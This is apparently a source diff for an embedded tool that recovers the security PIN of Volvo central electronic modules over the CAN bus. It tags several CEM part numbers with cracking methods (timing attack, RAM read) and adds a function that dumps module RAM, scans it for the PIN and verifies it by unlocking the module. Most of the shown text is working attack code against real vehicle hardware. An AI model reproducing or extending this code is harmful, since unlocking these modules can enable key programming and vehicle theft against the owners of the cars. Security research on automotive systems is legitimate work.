@@ -66,74 +66,84 @@ uint8_t *shuffle_order;
 
 /* configuration parameters for known CEM part numbers */
 
+enum method {
+  TIMING = 0,    /* timing attack */
+  TIMING_SLEEP,  /* timing attack w/ sleep mode */
+  READ_RAM,      /* find in RAM */
+  HASH,          /* hash collision */
+};
+
 struct _cem_params {
   uint32_t part_number;  /* CEM part number */
   uint32_t baud;         /* baud rate on high-speed bus */
+  enum method method;    /* cracking method */
   uint32_t shuffle;      /* PIN shuffle order */
 } cem_params[] = {
 
 /* P1 */
 
-  { 8690719,  CAN_500KBPS, 0 },
-  { 8690720,  CAN_500KBPS, 0 },
-  { 8690721,  CAN_500KBPS, 0 },
-  { 8690722,  CAN_500KBPS, 0 },
-  { 30765471, CAN_500KBPS, 0 },
-  { 30728906, CAN_500KBPS, 0 },
-  { 30765015, CAN_500KBPS, 0 },
-  { 31254317, CAN_500KBPS, 0 },
-  { 31327215, CAN_500KBPS, 3 },
-  { 31254749, CAN_500KBPS, 3 },
-  { 31254903, CAN_500KBPS, 0 },
-  { 31296881, CAN_500KBPS, 3 },
+  { 8690719,  CAN_500KBPS, TIMING_SLEEP, 0 },
+  { 8690720,  CAN_500KBPS, TIMING_SLEEP, 0 },
+  { 8690721,  CAN_500KBPS, TIMING_SLEEP, 0 },
+  { 8690722,  CAN_500KBPS, TIMING_SLEEP, 0 },
+  { 30765471, CAN_500KBPS, TIMING_SLEEP, 0 },
+  { 30728906, CAN_500KBPS, TIMING_SLEEP, 0 },
+  { 30765015, CAN_500KBPS, TIMING_SLEEP, 0 },
+  { 31254317, CAN_500KBPS, TIMING_SLEEP, 0 },
+  { 31327215, CAN_500KBPS, TIMING_SLEEP, 3 },
+  { 31254749, CAN_500KBPS, TIMING_SLEEP, 3 },
+  { 31254903, CAN_500KBPS, TIMING_SLEEP, 0 },
+  { 31296881, CAN_500KBPS, TIMING_SLEEP, 3 },
 
 /*  P2 CEM-B (Brick shaped 1999-2004 with K-line) */
 
-  { 8645716, CAN_250KBPS, 0 },
-  { 8645719, CAN_250KBPS, 0 },
-  { 8688434, CAN_250KBPS, 0 },
-  { 8688436, CAN_250KBPS, 0 },
-  { 8688513, CAN_250KBPS, 2 },
-  { 30657629, CAN_250KBPS, 0 },
-  { 9494336, CAN_250KBPS, 0 },
-  { 9494594, CAN_250KBPS, 0 },
-  { 8645171, CAN_250KBPS, 0 },
-  { 9452553, CAN_250KBPS, 0 },
-  { 8645205, CAN_250KBPS, 0 },
-  { 9452596, CAN_250KBPS, 0 },
-  { 8602436, CAN_250KBPS, 0 },
-  { 9469809, CAN_250KBPS, 0 },
-  { 8645200, CAN_250KBPS, 0 },
+  { 8645716, CAN_250KBPS, READ_RAM, 0 },
+  { 8645719, CAN_250KBPS, READ_RAM, 0 },
+  { 8688434, CAN_250KBPS, READ_RAM, 0 },
+  { 8688436, CAN_250KBPS, READ_RAM, 0 },
+  { 8688513, CAN_250KBPS, READ_RAM, 0 },
+  { 30657629, CAN_250KBPS, READ_RAM, 0 },
+  { 9494336, CAN_250KBPS, READ_RAM, 0 },
+  { 9494594, CAN_250KBPS, READ_RAM, 0 },
+  { 8645171, CAN_250KBPS, READ_RAM, 0 },
+  { 9452553, CAN_250KBPS, READ_RAM, 0 },
+  { 8645205, CAN_250KBPS, READ_RAM, 0 },
+  { 9452596, CAN_250KBPS, READ_RAM, 0 },
+  { 8602436, CAN_250KBPS, READ_RAM, 0 },
+  { 9469809, CAN_250KBPS, READ_RAM, 0 },
+  { 8645200, CAN_250KBPS, READ_RAM, 0 },
 
 /* P2 CEM-L (L shaped and marked L 2005-2014) */
 
-  { 30682981, CAN_500KBPS, 1 },
-  { 30682982, CAN_500KBPS, 1 },
-  { 30728356, CAN_500KBPS, 1 },
-  { 30728542, CAN_500KBPS, 1 },
-  { 30765149, CAN_500KBPS, 1 },
-  { 30765646, CAN_500KBPS, 1 },
-  { 30786475, CAN_500KBPS, 1 },
-  { 30786889, CAN_500KBPS, 1 },
-  { 31282457, CAN_500KBPS, 1 },
-  { 31314468, CAN_500KBPS, 1 },
-  { 31394158, CAN_500KBPS, 1 },
+  { 30682981, CAN_500KBPS, TIMING, 1 },
+  { 30682982, CAN_500KBPS, TIMING, 1 },
+  { 30728356, CAN_500KBPS, TIMING, 1 },
+  { 30728542, CAN_500KBPS, TIMING, 1 },
+  { 30765149, CAN_500KBPS, TIMING, 1 },
+  { 30765646, CAN_500KBPS, TIMING, 1 },
+  { 30786475, CAN_500KBPS, TIMING, 1 },
+  { 30786889, CAN_500KBPS, TIMING, 1 },
+  { 31282457, CAN_500KBPS, TIMING, 1 },
+  { 31314468, CAN_500KBPS, TIMING, 1 },
+  { 31394158, CAN_500KBPS, TIMING, 1 },
 
 /* P2 CEM-H (L shaped and marked H 2005 - 2008) */
 
-  { 30786476, CAN_500KBPS, 1 },
-  { 30728539, CAN_500KBPS, 1 },
-  { 30682982, CAN_500KBPS, 1 },
-  { 30728357, CAN_500KBPS, 1 },
-  { 30765148, CAN_500KBPS, 1 },
-  { 30765643, CAN_500KBPS, 1 },
-  { 30786476, CAN_500KBPS, 1 },
-  { 30786890, CAN_500KBPS, 1 },
-  { 30795115, CAN_500KBPS, 1 },
-  { 31282455, CAN_500KBPS, 1 },
-  { 31394157, CAN_500KBPS, 1 },
-  { 30786579, CAN_500KBPS, 1 },
+  { 30786476, CAN_500KBPS, TIMING, 1 },
+  { 30728539, CAN_500KBPS, TIMING, 1 },
+  { 30682982, CAN_500KBPS, TIMING, 1 },
+  { 30728357, CAN_500KBPS, TIMING, 1 },
+  { 30765148, CAN_500KBPS, TIMING, 1 },
+  { 30765643, CAN_500KBPS, TIMING, 1 },
+  { 30786476, CAN_500KBPS, TIMING, 1 },
+  { 30786890, CAN_500KBPS, TIMING, 1 },
+  { 30795115, CAN_500KBPS, TIMING, 1 },
+  { 31282455, CAN_500KBPS, TIMING, 1 },
+  { 31394157, CAN_500KBPS, TIMING, 1 },
+  { 30786579, CAN_500KBPS, TIMING, 1 },
 };
+
+struct _cem_params *p_hs_params;
 
 /* measured latencies are stored for each of possible value of a single PIN digit */
 
@@ -883,14 +893,7 @@ bool crack_range (uint8_t *pin, uint32_t pos, uint8_t *seq, uint32_t range, uint
   return (false);
 }
 
-/*******************************************************************************
- *
- * cemCrackPin - attempt to find the specified number of bytes in the CEM's PIN
- *
- * Returns: true if aborted
- */
-
-bool cemCrackPin (uint32_t maxBytes, bool verbose)
+bool cem_crack_pin_timing(uint32_t maxBytes, bool verbose)
 {
   uint8_t  pin[PIN_LEN];
   uint8_t  pinUsed[PIN_LEN];
@@ -1064,6 +1067,165 @@ bool cemCrackPin (uint32_t maxBytes, bool verbose)
   printf ("done\n");
 
   return (false);
+}
+
+void cem_crack_pin_read_ram()
+{
+  uint8_t  data[CAN_MSG_SIZE] = { 0xcf, CEM_HS_ECU_ID, 0xa7, 0xff, 0xd0, 0x00, 0x01, 0x10 };
+  uint8_t  rcv[CAN_MSG_SIZE];
+  uint8_t pin[PIN_LEN];
+  uint32_t start_addr = 0xffd000u;
+  uint8_t  *ram;
+  uint32_t addr, _addr;
+  uint32_t _id;
+  bool ret;
+  int i, j = 0, k;
+  int frame;
+  bool verbose = false;
+  bool found = false;
+  bool in_prog_mode = false;
+  int size = 8192;
+
+  ram = (uint8_t *)malloc(size);
+  if (!ram) {
+    printf("malloc %u failed\n", size);
+    return;
+  }
+  
+  printf("reading RAM...\n");
+  
+  for (k = 0; k < size; k += 0x10) {
+yet_again:
+    addr = _addr = start_addr + k;
+    
+    if (verbose)
+      printf("Reading address 0x%x\n", addr);
+
+    data[5] = _addr & 0xff; _addr >>= 8;
+    data[4] = _addr & 0xff; _addr >>= 8;
+    data[3] = _addr & 0xff;
+
+    canMsgSend (CAN_HS, 0xffffe, data, verbose);
+    i = 0;
+    frame = 0;
+
+    do {
+again:
+      i++;
+      if (i > 10)
+        goto yet_again;
+
+      ret = canMsgReceive (CAN_HS, &_id, rcv, 10, verbose);
+      if (!ret)
+        goto again;
+
+      _id &= 0xffff;
+
+      if (_id != 0x0003UL)
+        goto again;
+
+      if (verbose)
+        printf("Got frame %u from ECU id %u: %02x %02x %02x %02x %02x %02x %02x %02x \n", frame, _id, rcv[0], rcv[1], rcv[2], rcv[3], rcv[4], rcv[5], rcv[6], rcv[7]);
+    
+      i = 0;
+      
+      if ((frame == 0) && ((rcv[0] >> 6) == 0b11)) {
+        printf("%x: xx xx xx xx xx xx xx xx xx xx xx xx xx xx xx xx\n", addr);
+        j += 16;
+        break;
+      }
+      
+      if ((frame == 0) && ((rcv[0] >> 6) == 0b10)) {
+        memcpy(ram + j, rcv + 6, 2);
+        j += 2;
+      }
+    
+      if ((frame == 1) && ((rcv[0] >> 6) == 0b00)) {
+        memcpy(ram + j, rcv + 1, 7);
+        j += 7;
+      }
+
+      if ((frame == 2) && ((rcv[0] >> 6) == 0b01)) {
+        memcpy(ram + j, rcv + 1, 7);
+        j += 7;
+      }
+
+      frame++;
+
+      if (frame == 3) {
+        uint8_t *p = ram + j - 16;
+        printf("%x: %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x\n", addr, p[0], p[1], p[2], p[3], p[4], p[5], p[6], p[7],
+          p[8], p[9], p[10], p[11], p[12], p[13], p[14], p[15]);
+      }
+    } while (frame < 3);
+  }
+
+  i = 0;
+
+  do {
+    uint8_t *p = ram + i;
+
+    /* marker 0x01 0x00 */
+    if (p[0] != 0x01 || p[1] != 0x00)
+      goto out;
+
+    /* pin 6 BCD bytes */
+    for (j = 2; j < 2 + PIN_LEN; j++) {
+      if (p[j] > 0x99)
+        goto out;
+    }
+
+    /* ten 0xff */
+    for (; j < 2 + 16; j++) {
+      if (p[j] != 0xff)
+        goto out;
+    }
+
+    j = 2;
+    memcpy(pin, p + j, PIN_LEN);
+    printf("found PIN %02x %02x %02x %02x %02x %02x at address %x\n", p[j + 0], p[j + 1], p[j + 2], p[j + 3], p[j + 4], p[j + 5], start_addr + i + 2);
+
+    if (!in_prog_mode) {
+      progModeOn();
+      in_prog_mode = true;
+    }
+
+    if (cemUnlock (pin, NULL, NULL, verbose)) {
+      printf("PIN verified\n");
+      found = true;
+      break;
+    }
+
+    printf("bad PIN, searching next one...\n");
+out:
+    i++;
+  } while (i < size - 16 - 2);
+
+  if (!found)
+    printf("PIN was not found\n");
+
+  free(ram);
+}
+
+/*******************************************************************************
+ *
+ * cemCrackPin - attempt to find the specified number of bytes in the CEM's PIN
+ *
+ * Returns: true if aborted
+ */
+bool cemCrackPin(uint32_t maxBytes, bool verbose)
+{
+  switch(p_hs_params->method) {
+    case TIMING:
+      return cem_crack_pin_timing(maxBytes, verbose);
+    case READ_RAM:
+      cem_crack_pin_read_ram();
+      break;
+    default:
+      break; 
+  }
+
+  return false;
 }
 
 /*******************************************************************************
@@ -1338,7 +1500,13 @@ void setup (void)
   can_ls_init (CAN_125KBPS);
   k_line_keep_alive ();
   pn = ecu_read_part_number (CAN_LS, CEM_LS_ECU_ID);
-
+/*
+  if (!pn) {
+    k_line_keep_alive ();
+    can_ls_init (CAN_250KBPS);
+    k_line_keep_alive ();
+  }
+*/
   if (!pn) {
 
     /* might be CEM-L */
@@ -1356,8 +1524,6 @@ void setup (void)
   progModeOn ();
   pn = ecu_read_part_number_prog (CAN_HS, CEM_HS_ECU_ID);
 #endif
-
-  struct _cem_params *p_hs_params;
 
   if (!pn || ((p_hs_params = find_cem_params (pn)) == NULL)) {
     printf ("Unknown CEM part number %u. Don't know what to do.\n", pn);
@@ -1380,11 +1546,13 @@ void setup (void)
   if (!hs_inited)
     can_hs_init (p_hs_params->baud);
 
-  lcd_printf (0, 1, "Enter PROG mode.");
+  if (p_hs_params->method != READ_RAM) {
+    lcd_printf (0, 1, "Enter PROG mode.");
 
-  progModeOn ();
-  if (!hs_inited)
-      pn = ecu_read_part_number_prog (CAN_HS, CEM_HS_ECU_ID);
+    progModeOn ();
+    if (!hs_inited)
+        pn = ecu_read_part_number_prog (CAN_HS, CEM_HS_ECU_ID);
+  }
 #endif
 
   initialized = true;
